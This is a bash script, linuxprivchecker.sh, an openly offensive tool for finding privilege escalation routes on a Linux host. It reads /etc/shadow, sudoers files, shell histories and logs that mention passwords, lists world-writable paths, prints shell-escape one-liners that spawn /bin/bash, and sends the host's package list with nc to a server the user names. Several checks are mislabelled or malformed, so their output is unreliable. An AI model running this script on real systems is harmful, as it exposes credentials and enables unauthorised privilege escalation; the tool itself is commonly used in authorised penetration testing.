#!/bin/bash
###############################################################################################################
## [Title]: linuxprivchecker.sh -- a Linux Privilege Escalation Check Script
## [Original Author]: Mike Czumak (T_v3rn1x) -- https://twitter.com/SecuritySift
## Forked from linuxprivchecker.py -- https://github.com/sleventyeleven/linuxprivchecker
## [Contributors]:
## Mike Merrill (linted) -- https://github.com/linted
## James Hogan (5aru) -- https://github.com/5aru
## Ali Kaba (alibkaba) -- https://github.com/alibkaba
##-------------------------------------------------------------------------------------------------------------
## [Details]:
## This script is intended to be executed locally on a Linux box to enumerate basic system info and
## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
## passwords and applicable exploits.
##-------------------------------------------------------------------------------------------------------------
## [Warning]:
## This script comes as-is with no promise of functionality or accuracy.
##-------------------------------------------------------------------------------------------------------------
## [Modification, Distribution, and Attribution]:
## Permission is herby granted, free of charge, to any person obtaining a copy of this software and the
## associated documentation files (the "Software"), to use, copy, modify, merge, publish, distribute, and/or
## sublicense copies of the Software, and to permit persons to whom the Software is furnished to do so, subject
## to the following conditions:
##
## The software must maintain original author attribution and may not be sold
## or incorporated into any commercial offering.
##
## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR ## IMPLIED, INCLUDING BUT NOT
## LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO
## EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER
## IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE
## USE OR OTHER DEALINGS IN THE SOFTWARE.
###############################################################################################################

# command paths
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games"

# line formatting
LINE=$(printf "%*s\n" "80" | tr ' ' "#");

# title
scriptTITLE(){
echo ${LINE};
echo "    LINUX PRIVILEGE ESCALATION CHECKER"
echo "    https://github.com/linted/linuxprivchecker for more info..."
echo ${LINE};
echo
}

systemAREAtitle(){
  echo ${LINE};
  echo -e "    $systemAREA";
  echo ${LINE};
  echo
}

cmdRESPONSE(){
	# run and format cmd
  cmdRESULT=$(eval $1 2>/dev/null | sed 's|^|     |'; echo "${PIPESTATUS[0]}");

	# check cmd status
  if [ ${cmdRESULT:(-1)} -eq 0 ]; then
    echo "[+] $systemNAME";
    echo "${cmdRESULT%?}";
  else
    echo "[-] $systemNAME";
    echo "${cmdRESULT%?}";
  fi
}

operatingSYSTEM(){
  systemAREA="OPERATING SYSTEM";
  systemAREAtitle;

  systemNAME="Distribution";
  cmdRESPONSE "cat /etc/*-release";

  systemNAME="Kernel";
  cmdRESPONSE "if [ -f /proc/version ]; then cat /proc/version; else uname -a; fi";

  systemNAME="Hostname";
  cmdRESPONSE "hostname -f";
}

netWORK(){
  systemAREA="NETWORK";
  systemAREAtitle;

  systemNAME="Network Interfaces";
  cmdRESPONSE "ifconfig || ip a";

  systemNAME="DNS Resolver";
  cmdRESPONSE "cat /etc/resolv.conf";

  systemNAME="Route";
  cmdRESPONSE "route -n || ip route";
}

userENVIRONMENT(){
  systemAREA="USERS & ENVIRONMENT";
  systemAREAtitle;

  systemNAME="Current User";
  cmdRESPONSE "whoami";

  systemNAME="Current User ID";
  cmdRESPONSE "id";

  systemNAME="Who's Logged Right Now";
  cmdRESPONSE "w";

  systemNAME="Who's Logged Last";
  cmdRESPONSE "last";

  systemNAME="All Users";
  cmdRESPONSE "cat /etc/passwd";

  systemNAME="All Groups";
  cmdRESPONSE "cat /etc/group";

  systemNAME="Shadow File";
  cmdRESPONSE "cat /etc/shadow";

  systemNAME="Super Users";
  cmdRESPONSE "grep -v -E '^#' /etc/passwd | awk -F: '(/$3 == 0) { print /$1 }'";

  systemNAME="Sudo Users";
  cmdRESPONSE "cat /etc/sudoers | grep -v '#'";

  systemNAME="Sudoers (Privileged) [/etc/sudoers]";
  cmdRESPONSE "cat /etc/sudoers | grep -v '#'";

  systemNAME="Sudoers Files (Privileged) [/etc/sudoers.d/*]";
  cmdRESPONSE "cat /etc/sudoers.d/* | grep -v '#'";

  systemNAME="User's specific NOPASSWD sudo entries";
  cmdRESPONSE "sudo -ln";

  systemNAME="Root and Current User History (depends on privs)";
  cmdRESPONSE "ls -al ~/.*_history 2>/dev/null; ls -la /root/.*_history";

  systemNAME="Environment Variables";
  cmdRESPONSE "env | grep -v "LS_COLORS"";

  systemNAME="Printer";
  cmdRESPONSE "lpstat -a";
}

filePERMISSIONS(){
  systemAREA="FILE SYSTEMS & PERMISSIONS";
  systemAREAtitle;

  systemNAME="Mounts";
  cmdRESPONSE "mount";

  systemNAME="fstab Entries";
  cmdRESPONSE "cat /etc/fstab";

  systemNAME="Scheduled Cron Jobs";
  cmdRESPONSE "ls -al /etc/cron*";

  systemNAME="Writable Cron Directories";
  cmdRESPONSE "ls -aRl /etc/cron* | awk '/$1 ~ /w.$'";

  systemNAME="Root Home Folder Accessibility";
  cmdRESPONSE "ls -lt /root/";

  systemNAME="World Writeables Directories for User/Group 'root'";
  cmdRESPONSE "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -o+w \) -exec ls -ld '{}' ';' | grep root";

  systemNAME="World Writeables Directories for non-root Users";
  cmdRESPONSE "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' | grep -v root ";

  systemNAME="World Writeables Files";
  cmdRESPONSE "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0    002 \) -exec ls -l '{}' ';'";

  systemNAME="SUID/GUID Files and Directories";
  cmdRESPONSE "ls -ahlR /root";

  systemNAME="Configuration Files Containing Keyword 'password'";
  cmdRESPONSE "find /var/log -name '*.log' | xargs -l10 egrep 'pwd|password' 2>/dev/null";
}

applicationSERVICES(){
  systemAREA="APPLICATIONS & SERVICES";
  systemAREAtitle;

  systemNAME="Installed Packages";
  cmdRESPONSE "if [ -x "$(command -v dpkg)" ]; then dpkg -l | awk '{\$1=\$4=\"\"; print \$0}'; elif [ -x "$(command -v dnf)" ]; then dnf -qa | sort -u; elif [ -x "$(command -v rpm)" ]; then rpm -qa | sort -u; fi";

  systemNAME="Current Running Services";
  cmdRESPONSE "ps aux | awk '{print \$1,\$2,\$9,\$10,\$11}'";

  systemNAME="Bash version";
  cmdRESPONSE "bash --version | grep version";

  systemNAME="Sudo version";
  cmdRESPONSE "sudo -V | grep version";

  systemNAME="Apache Version and Modules";
  cmdRESPONSE "apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l";

  systemNAME="Apache Config File";
  cmdRESPONSE "cat /etc/apache2/apache2.conf";

  systemNAME="Processes and Packages Running as Root or other Superuser";
  EXTDGREP="($(ps -u 0 | tail -n+2 | rev | cut -d " " -f 1 | rev | cut -d "/" -f1 | sort | uniq | xargs | tr " " "|"))";
  cmdRESPONSE "if [ -x "$(command -v dpkg)" ]; then dpkg -l | grep -iE '${EXTDGREP}'; elif [ -x "$(command -v dnf)" ]; then dnf -qa | grep -iE '${EXTDGREP}'; elif [ -x "$(command -v rpm)" ]; then rpm -qa | grep -iE '${EXTDGREP}'; fi";

  systemNAME="Installed Tools";
  cmdRESPONSE "which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp";

  systemNAME="Related Shell Escape Sequences";
  cmdRESPONSE "if [ -x "$(command -v vi)" ]; then \
                  echo -ne \"vi-->\t:!bash\n\"; \
                  echo -ne \"vi-->\t:set shell=/bin/bash:shell\n\"; \
               fi; \
               if [ -x "$(command -v vim)" ]; then \
                  echo -ne \"vim-->\t:!bash\n\" | sed 's|^|    |'; \
                  echo -ne \"vim-->\t:set shell=/bin/bash:shell\n\" | sed 's|^|    |'; \
               fi; \
               if [ -x "$(command -v awk)" ]; then \
                  echo -ne \"awk-->\tawk 'BEGIN {system(\"/bin/bash\")}'\n\" | sed 's|^|    |'; \
               fi; \
               if [ -x "$(command -v perl)" ]; then \
                  echo -ne \"perl-->\tperl -e 'exec \"/bin/bash\";'\n\" | sed 's|^|    |'; \
               fi; \
               if [ -x "$(command -v python)" ]; then \
                  echo -ne \"python-->\tpython -c '__import__(\"os\").system(\"/bin/bash\")'\n\" | sed 's|^|    |'; \
               fi; \
               if [ -x "$(command -v find)" ]; then \
                  echo -ne \"find->\tfind / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;\n\" | sed 's|^|    |'; \
               fi; \
               if [ -x "$(command -v nmap)" ]; then \
                  echo -ne \"nmap-->\t--interactive\n\" | sed 's|^|    |'; \
               fi";

}

searchEXPLOITS(){
  systemAREA="Search for Exploits";
  systemAREAtitle;

  echo -e "[*] FINDING RELEVANT PRIVILEGE ESCALATION EXPLOITS..."
  read -p "[?] Would you like to search for possible exploits? [y/N] " connectToServer

  if [[ $connectToServer = y* ]]
  then
	   read -p "[?] What is the address of the server? " server
	    read -p "[?] What port is the server using? " port
	     echo -ne "\n\n"
	      echo -e "[ ] Searching on $server:$port"
	       printf "%*s\n" "80" | tr " " "*"
	        dpkg -l | tail -n +6 | awk '{print $2, $3} END {print ""}' | nc $server $port
	         printf "%*s\n" "80" | tr " " "*"
  fi
}

start(){
  scriptTITLE;
  operatingSYSTEM;
  netWORK;
  userENVIRONMENT;
  filePERMISSIONS;
  applicationSERVICES;
  searchEXPLOITS;
  echo ${LINE};
  echo "    FINISHED"
  echo ${LINE};
  echo
}

start;
